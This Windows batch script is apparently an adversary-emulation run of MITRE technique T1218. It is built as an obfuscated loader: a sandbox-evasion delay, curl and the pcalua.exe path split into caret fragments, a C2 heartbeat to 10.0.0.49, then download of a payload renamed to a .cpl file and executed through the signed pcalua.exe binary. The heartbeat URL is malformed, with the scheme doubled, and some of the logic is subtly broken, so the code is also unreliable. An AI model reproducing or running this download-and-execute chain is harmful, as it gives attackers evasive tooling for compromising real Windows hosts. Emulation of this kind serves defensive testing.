@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8197\b44238ef
SET fpakbq=Macula-Stage0-8197
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8197-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=illustrator.txt
SET fpldhe=8197

REM Helper variables for logging and paths
SET krpsl=%APPDATA%\!yydue!
SET lfwrh=!krpsl!\macula-simulations.log
SET jhqmn=!yktnwwf!\!edjwtl!
SET dfcty=!yktnwwf!\pcafile.cpl

REM Initial sandbox evasion delay (30-60s)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial delay start>>> "!lfwrh!" 2>nul
SET /A qytrp=!RANDOM! %% 31 + 30
timeout /t !qytrp! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial delay !qytrp!s complete>>> "!lfwrh!" 2>nul

REM TTP T1218: Signed Binary Proxy Execution - Pcalua.exe DLL load
SET res_ttp=0
SET err_ttp=

REM Create target directory if missing
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Creating directory !yktnwwf!>>> "!lfwrh!" 2>nul
mkdir "!yktnwwf!" >nul 2>&1

REM STEP 1: CORRECTED C2 HEARTBEAT WITH FULL URL CONSTRUCTION
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Starting C2 heartbeat check>>> "!lfwrh!" 2>nul

REM Obfuscate curl executable with caret fragmentation
SET s1=c^
SET s2=u^
SET s3=r^
SET s4=l
SET curlexe=!s1!!s2!!s3!!s4!

REM Construct complete heartbeat URL with scheme and path
SET h1=h^
SET h2=t^
SET h3=t^
SET h4=p^
SET h5=s^
SET h6=:^
SET h7=/
SET h8=/
SET scheme=!h1!!h2!!h3!!h4!!h5!!h6!!h7!!h8!

SET u1=/h^
SET u2=e^
SET u3=a^
SET u4=r^
SET u5=t^
SET u6=b^
SET u7=e^
SET u8=a^
SET u9=t^
SET u10=/
SET path=!u1!!u2!!u3!!u4!!u5!!u6!!u7!!u8!!u9!!u10!

REM Build complete URL: https://https://10.0.0.49/stage/2/icon.png?8197-7/heartbeat/
SET heartbeat_url=!scheme!!rdzgrnne!!path!

REM Execute heartbeat with proper user-agent and verbose error handling
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat URL: !heartbeat_url!>>> "!lfwrh!" 2>nul

SET a1=-^
SET a2=k^
SET a3= -^
SET a4=s^
SET a5= -^
SET a6=m^
SET a7= ^
SET a8=G^
SET a9=E^
SET a10=T
SET curlargs=!a1!!a2!!a3!!a4!!a5!!a6!!a7!!a8!!a9!!a10!

!curlexe! !curlargs! "!heartbeat_url!" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -o nul --connect-timeout 30 --max-time 45 >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat success (exit 0)>>> "!lfwrh!" 2>nul
    SET hbres=1
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat failed (exit !ERRORLEVEL!)>>> "!lfwrh!" 2>nul
    SET hbres=0
    SET err_ttp=heartbeat_failed_!ERRORLEVEL!
)

REM Inter-step delay with varied method
ping -n 7 127.0.0.1 >nul

REM STEP 2: Download DLL from external server only if heartbeat succeeded
IF !hbres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download start from !repbmqg!>>> "!lfwrh!" 2>nul
    
    !curlexe! -k -s -o "!jhqmn!" "!repbmqg!" -H "User-Agent: Mozilla/5.0" >nul 2>&1
    IF EXIST "!jhqmn!" (
        FOR %%F IN ("!jhqmn!") DO SET filesize=%%~zF
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download complete (size: !filesize! bytes)>>> "!lfwrh!" 2>nul
        SET dlres=1
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download failed>>> "!lfwrh!" 2>nul
        SET dlres=0
        SET err_ttp=download_failed
    )
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Skipping download due to heartbeat failure>>> "!lfwrh!" 2>nul
    SET dlres=0
)

REM Inter-step delay
timeout /t 12 /nobreak >nul

REM STEP 3: Rename DLL to CPL extension
IF !dlres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Renaming !edjwtl! to pcafile.cpl>>> "!lfwrh!" 2>nul
    ren "!jhqmn!" pcafile.cpl >nul 2>&1
    IF EXIST "!dfcty!" (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename successful>>> "!lfwrh!" 2>nul
        SET renres=1
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename failed>>> "!lfwrh!" 2>nul
        SET renres=0
        SET err_ttp=rename_failed
    )
)

REM Inter-step delay
CHOICE /C Y /N /D Y /T 9 >nul

REM STEP 4: Execute CPL via Pcalua.exe with heavy obfuscation
IF !renres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Starting Pcalua execution>>> "!lfwrh!" 2>nul
    
    REM Build Pcalua.exe path with heavy caret fragmentation
    SET p1=C^
    SET p2=:^
    SET p3=^ ^
    SET p4=Wi^
    SET p5=nd^
    SET p6=ow^
    SET p7=s^
    SET p8=^ ^
    SET p9=S^
    SET p10=ys^
    SET p11=te^
    SET p12=m^
    SET p13=3^
    SET p14=2^
    SET p15=^ ^
    SET p16=p^
    SET p17=c^
    SET p18=a^
    SET p19=l^
    SET p20=u^
    SET p21=a^
    SET p22=.
    SET p23=e^
    SET p24=x^
    SET p25=e
    SET pcalexe=!p1!!p2!!p3!!p4!!p5!!p6!!p7!!p8!!p9!!p10!!p11!!p12!!p13!!p14!!p15!!p16!!p17!!p18!!p19!!p20!!p21!!p22!!p23!!p24!!p25!
    
    REM Execute with minimal argument obfuscation
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Executing: !pcalexe! -a !dfcty!>>> "!lfwrh!" 2>nul
    !pcalexe! -a "!dfcty!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Pcalua execution successful (exit 0)>>> "!lfwrh!" 2>nul
        SET res_ttp=1
        SET err_ttp=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Pcalua execution failed (exit !ERRORLEVEL!)>>> "!lfwrh!" 2>nul
        SET err_ttp=execution_error_!ERRORLEVEL!
    )
)

REM Random final delay
SET /A finaldelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Final delay !finaldelay!s start>>> "!lfwrh!" 2>nul
timeout /t !finaldelay! /nobreak >nul

REM TTP Logging
SET ttp_id=T1218
SET ttp_name=SignedBinaryProxyExecution

REM Normalize timestamp to YYYY-MM-DD HH:MM:SS.SSS
SET logdate=!DATE:/=-!
SET logtime=!TIME:.=:!
SET logtime=!logtime: =0!

REM Build log line and append to file
IF DEFINED res_ttp (
    echo [!logdate! !logtime!][!omxgazu!]: !yydue!-!fpldhe!-!ttp_id!|!ttp_name!=!res_ttp!:!err_ttp!>> "!lfwrh!" 2>nul || echo.
)

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Simulation complete>>> "!lfwrh!" 2>nul

ENDLOCAL
exit /b 0